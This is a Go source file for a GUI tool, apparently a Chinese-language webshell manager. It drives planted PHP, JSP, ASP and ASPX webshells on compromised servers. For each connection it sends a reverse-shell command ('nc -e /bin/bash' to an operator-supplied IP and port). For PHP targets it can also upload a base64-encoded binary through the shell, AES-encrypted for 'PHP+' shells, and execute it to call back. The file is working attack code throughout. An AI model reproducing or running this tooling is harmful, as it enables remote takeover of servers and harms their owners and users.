package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"io/ioutil"
	"net/http"
	neturl "net/url"
	"os"
	"strings"
	"time"
)

var selectedT string

func showShellExecuteMode(w fyne.Window) {
	ncRadioButton := widget.NewRadioGroup([]string{"nc -e", "Go(upload)"}, func(selected string) {
		selectedT = selected
		fmt.Println("Selected:", selectedT)
	})

	radioGroup := widget.NewRadioGroup(nil, func(selected2 string) {
		fmt.Println("Selected:", selected2)

	})

	for _, conn := range connections {
		radioGroup.Options = append(radioGroup.Options, fmt.Sprintf("%s - %s", conn.Type, conn.URL))
	}
	radioGroup.Refresh()

	scrollContainer := container.NewScroll(radioGroup)
	scrollContainer.SetMinSize(fyne.NewSize(250, 600))

	commandEntry := widget.NewEntry()
	commandEntry.SetPlaceHolder("输入控制端IP")

	commandEntry2 := widget.NewEntry()
	commandEntry2.SetPlaceHolder("输入控制端端口")

	executeButton := widget.NewButtonWithIcon("确定", theme.ConfirmIcon(), func() {
		string1 := commandEntry.Text
		string2 := commandEntry2.Text
		err := os.Truncate("output.txt", 0)
		if err != nil {
			fmt.Println("Error truncating file:", err)
		}
		executeCommands(string1, string2, radioGroup.Selected)
	})

	sidebar := container.NewVBox(
		commandEntry,
		commandEntry2,
		ncRadioButton,
		executeButton,
		scrollContainer,
		layout.NewSpacer(),
	)

	sidebar.Resize(fyne.NewSize(250, 1000))
	w.SetContent(sidebar)
}

func executeCommands(string1, string2, selected string) {
	if selected == "" {
		fmt.Println("No connection selected")
		return
	}

	for _, conn := range connections {
		command := ""
		if fmt.Sprintf("%s - %s", conn.Type, conn.URL) == selected {
			fmt.Printf("Executing command on: %s - %s command is %s\n", conn.Type, conn.URL, command)
			fmt.Printf("selectedT is :%s", selectedT)
			switch conn.Type {
			case "PHP":
				if selectedT == "Go(upload)" {
					fmt.Println("测试PHP上传")
					result := runUPLOAD(conn.URL, conn.Password)
					fmt.Printf("test result is:%s\n", result)
					if result == "true" {
						time.Sleep(3 * time.Second)
						go func() {
							command = fmt.Sprintf("./config45 %s %s", string1, string2)
							fmt.Printf("The fullCommand is %s\n", command)
							executePHPcomands(conn.URL, conn.Password, command)
							fmt.Println("操作完成，反弹shell完毕")
						}()
					}
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executePHPcomands(conn.URL, conn.Password, command)
					}()
				}
			case "JSP":
				if selectedT == "Go(upload)" {
					dialog.ShowInformation("提示", "仅PHP和PHP+支持此种方法", w)
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executeJSPcomands(conn.URL, conn.Password, command)
					}()
				}
			case "ASP":
				if selectedT == "Go(upload)" {
					dialog.ShowInformation("提示", "仅PHP和PHP+支持此种方法", w)
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executeASPcomands(conn.URL, conn.Password, command)
					}()
				}
			case "ASPX":
				if selectedT == "Go(upload)" {
					dialog.ShowInformation("提示", "仅PHP和PHP+支持此种方法", w)
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executeASPXcomands(conn.URL, conn.Password, command)
					}()
				}
			case "PHP+":
				if selectedT == "Go(upload)" {
					fmt.Println("测试PHP上传")
					result := runUPLOAD2(conn.URL, conn.Password)
					fmt.Printf("test result is:%s\n", result)
					if result == "true" {
						time.Sleep(3 * time.Second)
						go func() {
							command = fmt.Sprintf("./config45 %s %s", string1, string2)
							fmt.Printf("The fullCommand is %s\n", command)
							executePHPEcomands(conn.URL, conn.Password, command)
							fmt.Println("操作完成，反弹shell完毕")
						}()
					}
				} else if selectedT == "nc -e" {
					go func() {
						command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
						fmt.Print("the full command is %s\n", command)
						executePHPEcomands(conn.URL, conn.Password, command)
					}()
				}
			case "JSP+":
				if selectedT == "Go(upload)" {
					dialog.ShowInformation("提示", "仅PHP和PHP+支持此种方法", w)
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executeJSPEcomands(conn.URL, conn.Password, command)
					}()
				}
			case "ASPX+":
				if selectedT == "Go(upload)" {
					dialog.ShowInformation("提示", "仅PHP和PHP+支持此种方法", w)
				} else if selectedT == "nc -e" {
					command = fmt.Sprintf("nc -e /bin/bash %s %s", string1, string2)
					fmt.Print("the full command is %s\n", command)
					go func() {
						executeASPXEcomands(conn.URL, conn.Password, command)
					}()
				}
			default:
				fmt.Println("Unknown connection type")
			}
			break
		}
	}

	w.SetContent(firstPage())
}

func runUPLOAD(url string, password string) string {
	targetURL := url
	filePath := "config45"
	uploadedFileName := "config45"

	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Printf("读取文件失败: %v\n", err)
		return "false"
	}

	encodedContent := base64.StdEncoding.EncodeToString(fileContent)

	phpCode := fmt.Sprintf(`$data = base64_decode('%s'); file_put_contents('%s', $data);`, encodedContent, uploadedFileName)

	data := neturl.Values{}
	data.Set(password, phpCode)
	req, err := http.NewRequest("POST", targetURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		fmt.Printf("创建请求失败: %v\n", err)
		return "false"
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("发送请求失败: %v\n", err)
		return "false"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("读取响应失败: %v\n", err)
		return "false"
	}

	fmt.Printf("响应状态: %s\n响应内容: %s\n", resp.Status, string(body))
	if resp.StatusCode == http.StatusOK {
		return "true"
	}
	return "false"
}

func runUPLOAD2(url string, password string) string {
	filePath := "config45"
	uploadedFileName := "config45"

	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		fmt.Printf("读取文件失败: %v\n", err)
		return "false"
	}

	encodedContent := base64.StdEncoding.EncodeToString(fileContent)

	phpCode := fmt.Sprintf(`hello|$data = base64_decode('%s'); file_put_contents('%s', $data);`, encodedContent, uploadedFileName)

	AESkey, sessionID = PHPEConnection1(url, password)

	encrypted, err := encryptAES128ECB([]byte(phpCode), []byte(AESkey))
	if err != nil {
	}

	postData := encrypted
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
	if err != nil {
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", sessionID)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
	}
	defer resp.Body.Close()

	postRespBody, err := ioutil.ReadAll(resp.Body)

	if err != nil {
	}

	fmt.Printf("the postRespBody is %s\n", string(postRespBody))

	if strings.Contains(string(postRespBody), "") {
		return "true"
	}
	return "false"
}
